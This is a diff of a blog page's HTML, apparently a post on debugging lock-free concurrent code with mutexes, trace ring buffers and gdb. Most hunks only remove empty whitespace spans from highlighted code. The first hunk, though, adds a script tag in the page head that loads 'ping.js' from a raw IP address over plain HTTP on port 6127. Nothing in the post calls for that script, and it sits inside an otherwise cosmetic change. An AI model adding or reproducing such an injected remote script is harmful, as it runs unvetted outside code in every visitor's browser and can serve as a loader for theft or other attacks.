@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -91,33 +93,33 @@ May 16, 2020
 <h2 id="back-to-the-old-good-mutex">Back to the old good mutex</h2>
 <p>One simple strategy is to use a traditional mutex or other lock mechanisms to make our lock free code into something much easier to reason about.</p>
 <p>Consider a lock free MPMC queue; making it thread safe with a mutex is plain simple:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="p">...</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">full</span><span class="p">)</span><span class="w"></span>
-<span class="w">        </span><span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="p">...</span><span class="w"></span>
-<span class="w">    </span><span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">full</span><span class="p">)</span>
+<span class="w">        </span><span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">n</span><span class="p">;</span>
+<span class="p">}</span>
 
-<span class="kt">uint32_t</span><span class="w"> </span><span class="nf">pop</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="p">...</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">empty</span><span class="p">)</span><span class="w"></span>
-<span class="w">        </span><span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="p">...</span><span class="w"></span>
-<span class="w">    </span><span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">uint32_t</span><span class="w"> </span><span class="nf">pop</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">empty</span><span class="p">)</span>
+<span class="w">        </span><span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mx</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">n</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p><label for='CipNb3N0PyogQSBgbXV0ZXhfbG9ja2AvYG11dGV4X3VubG9ja2AgcGFpciB3b3JrcwphcyBhbiBgQUNRVUlSRWAvYFJFTEVBU0VgIHBhaXI6IGluc3RydWN0aW9ucwpmcm9tIHRoZSBjcml0aWNhbCBzZWN0aW9uIChDUykgY2Fubm90IGJlIG1vdmVkICphYm92ZSB0aGUgbG9jayogbm9yCipiZWxvdyB0aGUgdW5sb2NrKiBidXQgaW5zdHJ1Y3Rpb25zICpvdXRzaWRlKiBvZiB0aGUgQ1MgY2FuIGdldCBpbnRvIHRoZSBDUwptb3ZpbmcgZnJvbSB0aGUgdXBzaWRlICpiZWxvdyB0aGUgbG9jayogYW5kCmZyb20gdGhlIGRvd25zaWRlICphYm92ZSB0aGUgdW5sb2NrKgoKSW4gc2hvcnQsIHNvbWUgcmVvcmRlcnMgYXJlICpzdGlsbCogcG9zc2libGU6IHRoaW5ncyBiZWZvcmUgYW5kIGFmdGVyIHRoZSBDUwpjYW4gZ2V0IGluLCB0aGluZ3MgaW4gdGhlIENTIGNhbm5vdCBnZXQgb3V0LiBtYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='CipNb3N0PyogQSBgbXV0ZXhfbG9ja2AvYG11dGV4X3VubG9ja2AgcGFpciB3b3JrcwphcyBhbiBgQUNRVUlSRWAvYFJFTEVBU0VgIHBhaXI6IGluc3RydWN0aW9ucwpmcm9tIHRoZSBjcml0aWNhbCBzZWN0aW9uIChDUykgY2Fubm90IGJlIG1vdmVkICphYm92ZSB0aGUgbG9jayogbm9yCipiZWxvdyB0aGUgdW5sb2NrKiBidXQgaW5zdHJ1Y3Rpb25zICpvdXRzaWRlKiBvZiB0aGUgQ1MgY2FuIGdldCBpbnRvIHRoZSBDUwptb3ZpbmcgZnJvbSB0aGUgdXBzaWRlICpiZWxvdyB0aGUgbG9jayogYW5kCmZyb20gdGhlIGRvd25zaWRlICphYm92ZSB0aGUgdW5sb2NrKgoKSW4gc2hvcnQsIHNvbWUgcmVvcmRlcnMgYXJlICpzdGlsbCogcG9zc2libGU6IHRoaW5ncyBiZWZvcmUgYW5kIGFmdGVyIHRoZSBDUwpjYW4gZ2V0IGluLCB0aGluZ3MgaW4gdGhlIENTIGNhbm5vdCBnZXQgb3V0LiBtYXJnaW5ub3Rlcw==' class='margin-toggle'/>
 <span class='marginnote'>
-<em>Most?</em> A <code><span class="highlight-candombe-inline"><span class="n">mutex_lock</span><span class="w"></span></span></code>/<code><span class="highlight-candombe-inline"><span class="n">mutex_unlock</span><span class="w"></span></span></code> pair works as an <code><span class="highlight-candombe-inline"><span class="n">ACQUIRE</span><span class="w"></span></span></code>/<code><span class="highlight-candombe-inline"><span class="n">RELEASE</span><span class="w"></span></span></code> pair: instructions from the critical section (CS) cannot be moved <em>above the lock</em> nor <em>below the unlock</em> but instructions <em>outside</em> of the CS can get into the CS moving from the upside <em>below the lock</em> and from the downside <em>above the unlock</em>
+<em>Most?</em> A <code><span class="highlight-candombe-inline"><span class="n">mutex_lock</span></span></code>/<code><span class="highlight-candombe-inline"><span class="n">mutex_unlock</span></span></code> pair works as an <code><span class="highlight-candombe-inline"><span class="n">ACQUIRE</span></span></code>/<code><span class="highlight-candombe-inline"><span class="n">RELEASE</span></span></code> pair: instructions from the critical section (CS) cannot be moved <em>above the lock</em> nor <em>below the unlock</em> but instructions <em>outside</em> of the CS can get into the CS moving from the upside <em>below the lock</em> and from the downside <em>above the unlock</em>
 <br /><br />
 In short, some reorders are <em>still</em> possible: things before and after the CS can get in, things in the CS cannot get out.
 </span></p>
@@ -125,23 +127,23 @@ In short, some reorders are <em>still</em> possible: things before and after the
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/threading/lock-free/mutex.png' /></figure></p>
-<p>If you still have a bug then it is more likely to be a <em>classic</em> bug like mistaking <code><span class="highlight-candombe-inline"><span class="o">&lt;</span><span class="w"></span></span></code> by <code><span class="highlight-candombe-inline"><span class="o">&lt;=</span><span class="w"></span></span></code> or a missing <code><span class="highlight-candombe-inline"><span class="o">+</span><span class="mi">1</span><span class="w"></span></span></code> somewhere –<em>and trust me, you will make this kind of errors too</em>.</p>
+<p>If you still have a bug then it is more likely to be a <em>classic</em> bug like mistaking <code><span class="highlight-candombe-inline"><span class="o">&lt;</span></span></code> by <code><span class="highlight-candombe-inline"><span class="o">&lt;=</span></span></code> or a missing <code><span class="highlight-candombe-inline"><span class="o">+</span><span class="mi">1</span></span></code> somewhere –<em>and trust me, you will make this kind of errors too</em>.</p>
 <h2 id="lightweight-prints">Lightweight prints</h2>
 <p><label for='CkEgYnVmZmVyIG9mIGZpeGVkIHNpemUgcG93ZXIgb2YgMiB3aXRoIGVudHJpZXMgb2YgZml4ZWQgc2l6ZQpzaW1wbGlmeSB0aGUgaW1wbGVtZW50YXRpb24gbWFraW5nIGl0IGZhc3RlciBhbmQgbGVzcyBpbnRydXNpdmUKdGhhbiBhIHBsYWluIGBwcmludGZgLiBtYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='CkEgYnVmZmVyIG9mIGZpeGVkIHNpemUgcG93ZXIgb2YgMiB3aXRoIGVudHJpZXMgb2YgZml4ZWQgc2l6ZQpzaW1wbGlmeSB0aGUgaW1wbGVtZW50YXRpb24gbWFraW5nIGl0IGZhc3RlciBhbmQgbGVzcyBpbnRydXNpdmUKdGhhbiBhIHBsYWluIGBwcmludGZgLiBtYXJnaW5ub3Rlcw==' class='margin-toggle'/>
 <span class='marginnote'>
-A buffer of fixed size power of 2 with entries of fixed size simplify the implementation making it faster and less intrusive than a plain <code><span class="highlight-candombe-inline"><span class="n">printf</span><span class="w"></span></span></code>.
+A buffer of fixed size power of 2 with entries of fixed size simplify the implementation making it faster and less intrusive than a plain <code><span class="highlight-candombe-inline"><span class="n">printf</span></span></code>.
 </span></p>
 <p>The idea is to have a global shared ring buffer for logs with multiple writers in mind.</p>
 <p>To avoid race conditions among the writers, the index is incremented atomically before doing each write. This is another example of a <em>reserve-and-then</em> strategy.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="n">trace</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">seq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_fetch_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tpos</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELAXED</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seq</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">tmask</span><span class="p">;</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="n">trace</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span><span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">seq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_fetch_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tpos</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELAXED</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seq</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">tmask</span><span class="p">;</span>
 
-<span class="w">    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">pos</span><span class="p">].</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">thread_id</span><span class="p">();</span><span class="w"></span>
-<span class="w">    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">pos</span><span class="p">].</span><span class="n">seq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seq</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">pos</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">msg</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">pos</span><span class="p">].</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">thread_id</span><span class="p">();</span>
+<span class="w">    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">pos</span><span class="p">].</span><span class="n">seq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seq</span><span class="p">;</span>
+<span class="w">    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">pos</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">msg</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p>In my <a href="/articles/2020/03/22/Lock-Free-Queue-Part-I.html">previous post</a> we saw that a write may not be visible to others until we need <em>commit</em>.</p>
@@ -149,70 +151,70 @@ A buffer of fixed size power of 2 with entries of fixed size simplify the implem
 <p><label for='CmBgYHNoZWxsCihnZGIpIHNldCBwcmludCBwcmV0dHkgb24KKGdkYikgcCAodHBvcyAtIDUpICYgdG1hc2sKKGdkYikgcCB0YnVmWyRdQDUKYGBgCgpQcmV0dHkgcHJpbnQgdGhlIGxhc3QgNSBlbnRyaWVzLgptYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='CmBgYHNoZWxsCihnZGIpIHNldCBwcmludCBwcmV0dHkgb24KKGdkYikgcCAodHBvcyAtIDUpICYgdG1hc2sKKGdkYikgcCB0YnVmWyRdQDUKYGBgCgpQcmV0dHkgcHJpbnQgdGhlIGxhc3QgNSBlbnRyaWVzLgptYXJnaW5ub3Rlcw==' class='margin-toggle'/>
 <span class='marginnote'>
-<span class="pseudo-pre"><code><span class="highlight-candombe"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> print pretty on
-<span class="o">(</span>gdb<span class="o">)</span> p <span class="o">(</span>tpos - <span class="m">5</span><span class="o">)</span> <span class="p">&amp;</span> tmask
-<span class="o">(</span>gdb<span class="o">)</span> p tbuf<span class="o">[</span>$<span class="o">]</span>@5</span></code></span>
+<span class="pseudo-pre"><code><span class="highlight-candombe"><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>print<span class="w"> </span>pretty<span class="w"> </span>on
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>p<span class="w"> </span><span class="o">(</span>tpos<span class="w"> </span>-<span class="w"> </span><span class="m">5</span><span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>tmask
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>p<span class="w"> </span>tbuf<span class="o">[</span>$<span class="o">]</span>@5</span></code></span>
 <br /><br />
 Pretty print the last 5 entries.
 </span></p>
 <p>Anyways the buffer is not read ever –it is a multiple-writers zero-readers buffer. This idea is to read the buffer from a debugger in a synchronous way so we should not have any race condition.</p>
 <h3 id="what-you-read-is-not-what-it-happen">What you read is not what it happen</h3>
 <p>Consider the following traced code:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="n">trace</span><span class="p">(</span><span class="s">&quot;foo...&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="n">foo</span><span class="p">();</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="n">trace</span><span class="p">(</span><span class="s">&quot;foo...&quot;</span><span class="p">);</span>
+<span class="n">foo</span><span class="p">();</span>
 </code></pre></div>
 
-<p>You may think that the trace is enough to know when <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span><span class="w"></span></span></code> is called.</p>
+<p>You may think that the trace is enough to know when <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span></span></code> is called.</p>
 <p>You may read</p>
 <pre><code>thread 1: foo...
 thread 2: foo...</code></pre>
-<p>but what happen actually was that thread 2 called <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span><span class="w"></span></span></code> before the thread 1:</p>
+<p>but what happen actually was that thread 2 called <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span></span></code> before the thread 1:</p>
 <div class="highlight-candombe"><pre><span></span><code><span class="c1">// thread 1                         // thread 2</span>
-<span class="n">trace</span><span class="p">(</span><span class="s">&quot;foo...&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">                                    </span><span class="n">trace</span><span class="p">(</span><span class="s">&quot;foo...&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">                                    </span><span class="n">foo</span><span class="p">();</span><span class="w"></span>
-<span class="n">foo</span><span class="p">();</span><span class="w"></span>
+<span class="n">trace</span><span class="p">(</span><span class="s">&quot;foo...&quot;</span><span class="p">);</span>
+<span class="w">                                    </span><span class="n">trace</span><span class="p">(</span><span class="s">&quot;foo...&quot;</span><span class="p">);</span>
+<span class="w">                                    </span><span class="n">foo</span><span class="p">();</span>
+<span class="n">foo</span><span class="p">();</span>
 </code></pre></div>
 
 <p>Interleaving is possible, and no, you cannot use a mutex there.</p>
 <p><label for='CmBgYAp0aHJlYWQgMTogYmVnaW4gZm9vLi4uCnRocmVhZCAyOiBiZWdpbiBmb28uLi4KdGhyZWFkIDI6IGVuZCBmb28uLi4KdGhyZWFkIDE6IGVuZCBmb28uLi4KYGBgCgpZb3UgbWF5IHJlYWQgdGhpcyBidXQuLi4KbWFyZ2lubm90ZXM=' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='CmBgYAp0aHJlYWQgMTogYmVnaW4gZm9vLi4uCnRocmVhZCAyOiBiZWdpbiBmb28uLi4KdGhyZWFkIDI6IGVuZCBmb28uLi4KdGhyZWFkIDE6IGVuZCBmb28uLi4KYGBgCgpZb3UgbWF5IHJlYWQgdGhpcyBidXQuLi4KbWFyZ2lubm90ZXM=' class='margin-toggle'/>
 <span class='marginnote'>
-<span class="pseudo-pre"><code><span class="highlight-candombe"><span class="kr">thread</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">begin</span><span class="w"> </span><span class="n">foo</span><span class="p">...</span><span class="w"></span>
-<span class="kr">thread</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="n">begin</span><span class="w"> </span><span class="n">foo</span><span class="p">...</span><span class="w"></span>
-<span class="kr">thread</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="n">foo</span><span class="p">...</span><span class="w"></span>
-<span class="kr">thread</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="n">foo</span><span class="p">...</span><span class="w"></span></span></code></span>
+<span class="pseudo-pre"><code><span class="highlight-candombe"><span class="kr">thread</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">begin</span><span class="w"> </span><span class="n">foo</span><span class="p">...</span>
+<span class="kr">thread</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="n">begin</span><span class="w"> </span><span class="n">foo</span><span class="p">...</span>
+<span class="kr">thread</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="n">foo</span><span class="p">...</span>
+<span class="kr">thread</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="n">foo</span><span class="p">...</span></span></code></span>
 <br /><br />
 You may read this but…
 </span></p>
 <p>Wrapping the code with two traces is a better alternative:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="n">trace</span><span class="p">(</span><span class="s">&quot;begin foo&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="n">foo</span><span class="p">();</span><span class="w"></span>
-<span class="n">trace</span><span class="p">(</span><span class="s">&quot;end foo&quot;</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="n">trace</span><span class="p">(</span><span class="s">&quot;begin foo&quot;</span><span class="p">);</span>
+<span class="n">foo</span><span class="p">();</span>
+<span class="n">trace</span><span class="p">(</span><span class="s">&quot;end foo&quot;</span><span class="p">);</span>
 </code></pre></div>
 
-<p>However you still cannot know if thread 1 called <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span><span class="w"></span></span></code> before or after the thread 2.</p>
-<p>If <code><span class="highlight-candombe-inline"><span class="n">trace</span><span class="p">()</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span><span class="w"></span></span></code> are inline, the compiler/CPU may see this:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;begin foo&quot;</span><span class="p">;</span><span class="w"></span>
-<span class="n">foo_a</span><span class="p">;</span><span class="w"></span>
-<span class="n">foo_b</span><span class="p">;</span><span class="w"></span>
-<span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;end foo&quot;</span><span class="p">;</span><span class="w"></span>
+<p>However you still cannot know if thread 1 called <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span></span></code> before or after the thread 2.</p>
+<p>If <code><span class="highlight-candombe-inline"><span class="n">trace</span><span class="p">()</span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span></span></code> are inline, the compiler/CPU may see this:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;begin foo&quot;</span><span class="p">;</span>
+<span class="n">foo_a</span><span class="p">;</span>
+<span class="n">foo_b</span><span class="p">;</span>
+<span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;end foo&quot;</span><span class="p">;</span>
 </code></pre></div>
 
-<p>There is an obvious relationship between the first and the second trace instructions so <code><span class="highlight-candombe-inline"><span class="s">&quot;begin foo...&quot;</span><span class="w"></span></span></code> happens before <code><span class="highlight-candombe-inline"><span class="s">&quot;end foo...&quot;</span><span class="w"></span></span></code> but nothing prevents the compiler or the CPU to reorder the inline instructions from <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span><span class="w"></span></span></code>.</p>
+<p>There is an obvious relationship between the first and the second trace instructions so <code><span class="highlight-candombe-inline"><span class="s">&quot;begin foo...&quot;</span></span></code> happens before <code><span class="highlight-candombe-inline"><span class="s">&quot;end foo...&quot;</span></span></code> but nothing prevents the compiler or the CPU to reorder the inline instructions from <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span></span></code>.</p>
 <p>So what could happen is:</p>
 <div class="highlight-candombe"><pre><span></span><code><span class="c1">// thread 1                         // thread 2</span>
-<span class="n">foo_a</span><span class="p">;</span><span class="w"></span>
-<span class="n">foo_b</span><span class="p">;</span><span class="w"></span>
-<span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;begin foo&quot;</span><span class="p">;</span><span class="w"></span>
-<span class="w">                                    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;begin foo&quot;</span><span class="p">;</span><span class="w"></span>
-<span class="w">                                    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;end foo&quot;</span><span class="p">;</span><span class="w"></span>
-<span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;end foo&quot;</span><span class="p">;</span><span class="w"></span>
-<span class="w">                                    </span><span class="n">foo_a</span><span class="p">;</span><span class="w"></span>
-<span class="w">                                    </span><span class="n">foo_b</span><span class="p">;</span><span class="w"></span>
+<span class="n">foo_a</span><span class="p">;</span>
+<span class="n">foo_b</span><span class="p">;</span>
+<span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;begin foo&quot;</span><span class="p">;</span>
+<span class="w">                                    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;begin foo&quot;</span><span class="p">;</span>
+<span class="w">                                    </span><span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;end foo&quot;</span><span class="p">;</span>
+<span class="n">tbuf</span><span class="p">[</span><span class="n">tpos</span><span class="o">++</span><span class="p">].</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;end foo&quot;</span><span class="p">;</span>
+<span class="w">                                    </span><span class="n">foo_a</span><span class="p">;</span>
+<span class="w">                                    </span><span class="n">foo_b</span><span class="p">;</span>
 </code></pre></div>
 
-<p>So not only thread 1 called <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span><span class="w"></span></span></code> <em>before</em> thread 2 but even after the log entry <code><span class="highlight-candombe-inline"><span class="s">&quot;end foo&quot;</span><span class="w"></span></span></code> the thread 2 <em>didn’t call</em> <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span><span class="w"></span></span></code> at all.</p>
+<p>So not only thread 1 called <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span></span></code> <em>before</em> thread 2 but even after the log entry <code><span class="highlight-candombe-inline"><span class="s">&quot;end foo&quot;</span></span></code> the thread 2 <em>didn’t call</em> <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span></span></code> at all.</p>
 <p>Sorry to say but you don’t have much options and whatever you choose it will affect the precision of the log or it will affect the behaviour of you code under debug.</p>
 <h2 id="automated-tools">Automated tools</h2>
 <p>This would be the holy grail but we are still far from a tool to detect race conditions in general.</p>
